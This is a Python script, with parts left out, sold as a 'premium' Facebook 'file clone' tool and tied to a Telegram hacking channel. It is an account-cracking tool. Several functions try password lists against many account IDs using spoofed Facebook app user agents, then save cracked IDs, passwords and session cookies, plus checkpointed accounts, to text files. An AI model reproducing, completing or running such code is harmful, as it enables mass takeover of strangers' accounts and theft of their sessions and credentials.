#==================[OWNER]==================#
#CODDED BY SHIMUL
#Send by : https://t.me/DARKCYBER420
#==================[MODULE]==================#
import os
import sys
import time
...
logo = f'''
\033[1;32m   db    88""Yb    db             \033[1;31mYb  dP 8888b.  
\033[1;32m  dPYb   88__dP   dPYb   ________  \033[1;31mYbdP   8I  Yb 
\033[1;32m dP__Yb  88"Yb   dP__Yb  """"""""  \033[1;31mdPYb   8I  dY 
\033[1;32mdP""""Yb 88  Yb dP""""Yb          \033[1;31mdP  Yb 8888Y"  v9
\033[1;37m=====================================================\x1b[1;97m
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m AUTHOR {R}>> {G}MD SHIMUL
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m GITHAB {R}>> {G}I-MRSH4MUL
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m TOOLS {R} >> {G}FILE CLONE
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m TYPE {R}  >> {G}PREMIUM 
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m Teligerm {R} >>
 {G} https://t.me/DARKCYBER420
\033[1;37m=====================================================\x1b[1;97m'''
#==================[MENU]==================#
def mmk():
    clear()
...
def graph(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [ARAFAT-M1]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(cps)));sys.stdout.flush()
    sys.stdout.flush()
    ...
    try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[ARAFAT-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/ARAFAT-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R} <[ARAFAT-CP]>{B} '+ids+f'{G} |{G} '+pas+'\033[1;97m')
...
def graph2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [ARAFAT-M2]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r{B} <[ARAFAT-CP]> '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
                open('/sdcard/ARAFAT-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
...
def graph3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [ARAFAT-M3]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
...
def graph4(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [ARAFAT-M4]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[ARAFAT-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/ARAFAT-FILE-M4-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[ARAFAT-CP]> '+ids+f' | '+pas+'\033[1;97m')
                open('/sdcard/ARAFAT-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
